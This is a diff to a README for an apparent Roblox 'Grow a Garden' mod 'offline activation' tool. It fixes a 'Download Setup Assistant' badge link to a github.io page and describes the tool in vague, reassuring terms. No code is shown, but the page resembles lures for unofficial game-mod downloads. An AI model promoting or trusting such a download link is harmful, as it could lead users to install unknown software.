@@ -1,6 +1,6 @@
 # Roblox Grow a Garden Mod — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](roblox-grow-a-garden-setup-assistant.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://roblox-grow-a-garden-setup-assistant.github.io/.github)
   
 > It simply prepares an offline sandbox so you can learn gardening basics without needing Wi-Fi or an account.
 
